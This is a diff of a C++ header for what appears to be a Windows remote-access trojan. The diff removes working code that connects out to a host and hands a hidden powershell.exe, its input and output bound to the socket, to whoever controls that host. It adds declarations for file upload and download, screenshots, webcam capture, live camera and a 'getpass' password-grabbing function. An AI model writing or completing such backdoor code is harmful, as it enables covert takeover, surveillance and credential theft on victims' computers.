@@ -1,78 +1,46 @@
 #ifndef CLIENT_HPP
 #define CLIENT_HPP
 
-#include "client.cpp"
+#include <WinSock2.h>
+#include <WS2tcpip.h>
+#include <stdio.h>
+#include <stdlib.h>   // Needed for _wtoi
 
-Client::Client(const char* chost, unsigned short int cport) {
-  server = chost;
-  port = cport;
-  // create socket
-  printf("creating socket");
-  WSAStartup(MAKEWORD(2, 2), &wsaData);
-  socket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
-}
+#define BUFFER_SIZE (1024)
 
-void Client::connect_socket() {
-  // declare connect type, host, port
-  addr.sin_family = AF_INET;
-  addr.sin_addr.s_addr = inet_addr(server);
-  addr.sin_port = htons(port);
+class Commands {
+public:
+    void print_help();
+    void download(char* filefrom, char* fileto);
+    void upload(char* filefrom, char* fileto);
+    void screenshot(char* outpath);
+    void webcam_snap(char* output);
+    void livecam();
+    void getpass();
+};
 
-  // now connect
-  //try {
-  WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
-  //} catch (err) {
-  //	closesocket(socket);
-  //	WSACleanup();
-  //}
-}
 
-bool Client::check_connection() {
-  // check if there is any connection at all
-  memset(rdata, 0, sizeof(rdata));
-  int RecvCode = recv(socket, rdata, BUFFER_SIZE, 0);
-  if (RecvCode <= 0) {
-    closesocket(socket);
-    WSACleanup();
-    return false;
-  }
-  else {
-    return true;
-  }
-}
+class Client : Commands {
+public:
+    Client(const char* chost, unsigned short int cport);
+    void connect_socket();
+    bool check_connection();
+    void receive_commands();
+    int start_shell();
 
-void Client::receive_commands() {
-  memset(rdata, 0, sizeof(rdata));
-  int RecvCode = recv(socket, rdata, BUFFER_SIZE, 0);
-  if (RecvCode <= 0) {
-    closesocket(socket);
-    WSACleanup();
-  }
-  if (strcmp(rdata, "exit\n") == 0) {
-    exit(0);
-  }
-}
+    void cleanup() {
+        closesocket(socket);
+        WSACleanup();
+    }
 
-int Client::start_shell() {
-  STARTUPINFO sinfo = { 0 };
-  PROCESS_INFORMATION pinfo;
-  char Process[] = "powershell.exe";
+private:
+    WSADATA wsaData;
+    struct sockaddr_in addr;
+    SOCKET socket;
 
-  memset(&sinfo, 0, sizeof(sinfo));
-  sinfo.cb = sizeof(sinfo);
-  // window configuration
-  sinfo.wShowWindow = SW_HIDE;
-  sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-  // all below are equal to socket
-  sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;
-
-  // starting powershell
-  CreateProcess(NULL, (LPSTR)Process, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&sinfo, &pinfo);
-  // the errors above will only show for vs, use mingw thats what i did because my vs gives runtimes errors
-  WaitForSingleObject(pinfo.hProcess, INFINITE);
-  CloseHandle(pinfo.hProcess);
-  CloseHandle(pinfo.hThread);
-  return 0;
-}
+    char rdata[BUFFER_SIZE];
+    const char* server;
+    unsigned short int port;
+};
 
 #endif //CLIENT_HPP
